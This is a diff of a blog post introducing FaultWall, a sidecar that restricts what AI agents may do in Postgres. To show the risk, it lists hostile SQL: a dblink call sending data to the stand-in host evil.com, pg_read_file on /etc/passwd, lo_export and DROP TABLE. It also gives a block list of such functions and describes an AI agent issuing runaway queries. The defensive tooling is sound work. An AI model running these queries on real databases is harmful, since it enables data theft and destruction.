@@ -179,52 +179,81 @@
 
     <div class="tldr">
       <h3>TL;DR</h3>
-      <p>AI agents connect to databases with real credentials. Postgres roles are too static to scope what an agent should do <em>right now</em>. I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a sidecar that enforces per-agent, per-task policies using a real Postgres AST parser. It blocks dangerous functions, restricts table access by mission, and kills violating queries. One Go binary, one YAML file, MIT licensed.</p>
+      <p>I hooked up a Claude Opus 4 agent to my Postgres 16 instance with a LangChain SQL toolkit. It worked great until the model generated a query that missed a WHERE clause and scanned 2 million rows. Postgres roles can't scope permissions to what an agent is doing <em>right now</em>, so I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a>: a sidecar that enforces per-agent, per-task policies using the real Postgres C parser. Blocks dangerous functions, restricts table access by mission, kills violating queries. One Go binary, one YAML config.</p>
     </div>
 
-    <h2>The Problem</h2>
+    <h2>How it started</h2>
 
-    <p>I started giving AI agents direct Postgres access — data analysis, reports, automated ops. It's incredibly useful until the LLM generates a query without a WHERE clause, or picks the wrong table, or calls a function it shouldn't.</p>
+    <p>I was building a data analysis pipeline with LangChain's <code>SQLDatabaseToolkit</code> and Claude Opus 4. The setup is dead simple: give the agent a Postgres connection string, tell it what you want, and it writes the SQL. I had it pulling customer feedback summaries, joining against product tables, generating weekly reports. Worked beautifully for about three weeks.</p>
 
-    <p>The scary part: the same agent credentials that run <code>SELECT * FROM feedback</code> can also run:</p>
+    <p>Then I asked it to "find all feedback about shipping delays" and it generated <code>SELECT * FROM feedback</code> without any filter. Two million rows. CPU pinned at 90% for three minutes. The monitoring didn't catch it because the connection came from a legit database user. Looked like normal app traffic.</p>
+
+    <p>That was the harmless version. I started thinking about what else that same connection string could do. So I opened psql with the agent's credentials and tried a few things:</p>
 
     <ul>
-      <li><code>DROP TABLE users;</code></li>
-      <li><code>SELECT * FROM payments;</code> — data it doesn't need</li>
-      <li><code>SELECT pg_read_file('/etc/passwd');</code> — read server files</li>
-      <li><code>SELECT dblink('host=evil.com ...')</code> — exfiltrate to external server</li>
+      <li><code>DROP TABLE users;</code> worked. (I rolled it back.)</li>
+      <li><code>SELECT * FROM payments;</code> returned full credit card data. The agent had no business seeing that table.</li>
+      <li><code>SELECT pg_read_file('/etc/passwd');</code> read server files right through Postgres.</li>
+      <li><code>SELECT dblink('host=evil.com ...')</code> would let you tunnel data to an external server.</li>
+      <li><code>SELECT lo_export(16389, '/tmp/dump.txt');</code> dumps large objects to the filesystem.</li>
     </ul>
 
-    <p>Postgres doesn't know an AI generated the query. It just sees a valid connection with valid credentials.</p>
+    <p>All valid SQL. All executed with the agent's credentials. Postgres has no idea that an LLM generated the query vs a human typing it.</p>
 
     <div class="callout">
-      <p>This is the <strong>confused deputy problem</strong>. The agent is authorized to be there. The query it generates might not be.</p>
+      <p>In security this is called the <strong>confused deputy problem</strong>. The agent is authorized. The query it generates might not be. And there's nothing in between.</p>
     </div>
 
-    <p>Postgres roles don't solve it — they're static. An agent doing "summarize feedback" has the same permissions as when it's doing "delete old records." You need something that understands what the agent is supposed to be doing <em>right now</em>.</p>
+    <p>I looked at what Postgres gives you natively. Roles help but they're static. When my agent is doing "summarize feedback" it has the exact same permissions as when it's doing "delete old records." You can create read-only users, but half the useful agent workflows need write access. Row-level security is better, but you're still trusting the agent to include the right predicates. None of it stops function calls like <code>pg_sleep(999)</code> or <code>lo_export()</code>.</p>
 
-    <h2>FaultWall</h2>
+    <h2>What I built</h2>
 
-    <p>I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a> — a sidecar that enforces per-agent, per-task database policies. Every agent identifies itself and declares its current task. FaultWall checks every query against that declaration.</p>
+    <p>I built <a href="https://github.com/shreyasXV/faultwall">FaultWall</a>. It's a Go binary that sits next to Postgres as a sidecar. Agents identify themselves and declare what task they're running. FaultWall watches every active query and checks it against a YAML policy file.</p>
+
+    <p>Here's what the policy looks like for my LangChain setup:</p>
 
 <pre><code># policies.yaml
 agents:
-  cursor-ai:
+  langchain-analyst:
     missions:
       summarize-feedback:
-        allowed_tables: [public.feedback]
+        allowed_tables: [public.feedback, public.products]
         allowed_operations: [SELECT]
+        conditions:
+          - "WHERE created_at > now() - interval '30 days'"
       update-shipping:
         allowed_tables: [public.orders]
         allowed_operations: [SELECT, UPDATE]
 
+  cursor-agent:
+    missions:
+      code-review:
+        allowed_tables: [public.pull_requests, public.reviews]
+        allowed_operations: [SELECT]
+
 blocked_functions:
   - pg_sleep
+  - pg_terminate_backend
   - lo_export
+  - lo_import
   - pg_read_file
-  - dblink</code></pre>
+  - pg_read_binary_file
+  - dblink
+  - dblink_exec
+  - set_config</code></pre>
 
-    <p>Queries go through a real PostgreSQL AST parser (<a href="https://github.com/pganalyze/pg_query_go">pg_query_go</a> — the same C parser Postgres uses internally). No regex. It extracts operations, tables (including CTEs, subqueries, JOINs), and function calls. You can't sneak a <code>pg_sleep(999)</code> inside a SELECT past it.</p>
+    <p>The agent sets <code>application_name</code> when it connects (one line in LangChain, or a simple <code>SET</code> in raw SQL), and FaultWall knows who it is and what it should be doing.</p>
+
+    <p>Under the hood, every query goes through <a href="https://github.com/pganalyze/pg_query_go">pg_query_go</a>, which wraps the actual C parser from PostgreSQL itself. Not regex. Not string matching. The real parser that Postgres uses to execute your queries. It extracts the operation type, every table reference (including CTEs, subqueries, JOINs), and every function call.</p>
+
+    <p>This matters because regex-based approaches miss stuff like:</p>
+
+<pre><code>-- looks like a SELECT, but calls a dangerous function
+SELECT pg_sleep(999);
+SELECT lo_export(16389, '/tmp/dump.txt');
+SELECT * FROM dblink('host=evil.com', 'SELECT * FROM secrets');</code></pre>
+
+    <p>The AST parser catches all of them. You can't bury a <code>pg_read_file()</code> inside a nested subquery and sneak it past.</p>
 
     <div class="terminal">
       <div class="terminal-bar">
@@ -234,42 +263,44 @@ blocked_functions:
         <span style="color:#536471;font-size:13px;margin-left:8px;font-family:monospace;">faultwall — enforce mode</span>
       </div>
       <div class="terminal-body">
-        <div class="t-comment"># Agent tries a table outside its mission</div>
-        <div><span class="t-prompt">psql&gt;</span> SET application_name = '<span class="t-green">agent:cursor-ai:mission:summarize-feedback</span>';</div>
+        <div class="t-comment"># LangChain agent connects with its identity</div>
+        <div><span class="t-prompt">psql&gt;</span> SET application_name = '<span class="t-green">agent:langchain-analyst:mission:summarize-feedback</span>';</div>
+        <div style="margin-top:10px" class="t-comment"># Tries to read a table outside its mission scope</div>
         <div><span class="t-prompt">psql&gt;</span> SELECT * FROM <span class="t-red">public.users</span>;</div>
         <div style="margin-top:6px;"><span class="t-red">FATAL: terminating connection due to administrator command</span></div>
-        <div style="margin-top:10px"><span class="t-purple">Policy enforcement:</span> <span class="t-red">BLOCKED</span> agent=<span class="t-green">cursor-ai</span> reason=<span class="t-red">table_not_in_mission</span></div>
-        <div style="margin-top:14px" class="t-comment"># Agent tries a dangerous function</div>
+        <div style="margin-top:6px"><span class="t-purple">[faultwall]</span> <span class="t-red">BLOCKED</span> pid=4821 agent=langchain-analyst reason=table_not_in_mission table=public.users</div>
+        <div style="margin-top:14px" class="t-comment"># Tries to read /etc/passwd through Postgres</div>
         <div><span class="t-prompt">psql&gt;</span> SELECT <span class="t-red">pg_read_file</span>('/etc/passwd');</div>
         <div style="margin-top:6px;"><span class="t-red">FATAL: terminating connection due to administrator command</span></div>
-        <div style="margin-top:10px"><span class="t-purple">Policy enforcement:</span> <span class="t-red">BLOCKED</span> reason=<span class="t-red">blocked_function:pg_read_file</span></div>
-        <div style="margin-top:14px" class="t-comment"># Agent stays within policy</div>
+        <div style="margin-top:6px"><span class="t-purple">[faultwall]</span> <span class="t-red">BLOCKED</span> pid=4822 reason=blocked_function:pg_read_file</div>
+        <div style="margin-top:14px" class="t-comment"># Stays within policy, works fine</div>
         <div><span class="t-prompt">psql&gt;</span> SELECT * FROM <span class="t-green">public.feedback</span> WHERE created_at > now() - interval '30 days';</div>
         <div style="margin-top:4px"><span class="t-green">(47 rows) ✓</span></div>
       </div>
     </div>
 
-    <p>Tested against 11 real attack scenarios on a live Postgres instance — all passed. Table blocking, function blocking, operation restrictions, unregistered agent rejection, mission scoping.</p>
+    <p>I tested 11 scenarios on a real Postgres 16 instance running on a separate machine. Not mocks, not unit tests. Actual <code>psql</code> connections, actual <code>pg_terminate_backend()</code> calls. Table blocking, function blocking (pg_sleep, lo_export, pg_read_file), operation restrictions (allowing SELECT but blocking DELETE), unregistered agent rejection, and monitoring unidentified connections. All 11 passed.</p>
 
     <div class="screenshot">
       <img src="dashboard.jpg" alt="FaultWall dashboard showing agent violations, cost attribution, and query monitoring">
-      <div class="caption">FaultWall dashboard — violations, connected agents, per-tenant cost attribution</div>
+      <div class="caption">FaultWall dashboard showing 5 blocked violations, connected agents, and per-tenant cost attribution.</div>
     </div>
 
-    <h2>Limitations</h2>
+    <p>Two modes: <strong>monitor</strong> logs everything without blocking (so you can see what your agents actually do before you start killing queries) and <strong>enforce</strong> terminates violating connections via <code>pg_terminate_backend()</code>.</p>
 
-    <p>Being honest about what it doesn't do:</p>
+    <h2>What it doesn't do</h2>
 
-    <ul>
-      <li><strong>Polling, not proxying.</strong> FaultWall polls <code>pg_stat_activity</code> every ~10s. Short queries can complete before detection. Long-running agent workloads get caught.</li>
-      <li><strong>Identity is self-reported.</strong> <code>application_name</code> is spoofable. A sophisticated attacker could impersonate a registered agent.</li>
-    </ul>
+    <p>I want to be upfront about the limitations because I've seen too many projects that oversell.</p>
 
-    <p>It's a seatbelt, not an airbag. Catches the 95% case — confused agents, bad prompts, scope creep. I have an early eBPF prototype (private repo, Linux-only) for real-time kernel-level interception, and cryptographic identity via signed JWTs. Neither is shipped yet.</p>
+    <p><strong>It polls, it doesn't proxy.</strong> FaultWall connects to Postgres as a monitoring user and checks <code>pg_stat_activity</code> every ~10 seconds. It's a sidecar, not an inline proxy. That means a fast <code>DROP TABLE</code> can finish before FaultWall sees it. Longer queries (analytics, agent workloads, anything over a few seconds) get caught and killed. For my use case this works because LLM-generated analytics queries tend to run for 5-30 seconds, not milliseconds.</p>
+
+    <p><strong>Agent identity is self-reported.</strong> Agents set <code>application_name</code> to identify themselves, and that field is spoofable. If someone already has database credentials and wants to impersonate a different agent, they can. This is the seatbelt-not-airbag tradeoff: it catches the 95% case (confused models, bad prompts, scope creep) but won't stop a determined attacker who's already inside your database.</p>
+
+    <p>I have an early eBPF prototype in a private repo that hooks into PostgreSQL at the kernel level for real-time query interception (zero polling delay). And I'm planning cryptographic agent identity with signed JWTs instead of application_name. But neither is shipped and I'm not going to claim otherwise.</p>
 
     <hr class="divider">
 
-    <p>If you're running agents against Postgres and want to see what they're actually doing:</p>
+    <p>If you have agents talking to Postgres and want to see what they're actually doing:</p>
 
 <pre><code>docker run -e DATABASE_URL=postgres://user:pass@host:5432/db \
   -e POLICY_FILE=/app/policies.yaml \
@@ -277,7 +308,7 @@ blocked_functions:
   -p 8080:8080 \
   ghcr.io/shreyasxv/faultwall:main</code></pre>
 
-    <p>Per-agent metrics and violations at <code>localhost:8080</code> in 30 seconds. Start in monitor mode, see what your agents do, flip to enforce when ready.</p>
+    <p>Open <code>localhost:8080</code> and you'll see per-agent activity within about 30 seconds. Start in monitor mode. See what your agents do. Then flip to enforce when you're comfortable.</p>
 
     <div class="cta">
       <a href="https://github.com/shreyasXV/faultwall" class="cta-btn cta-primary">GitHub</a>
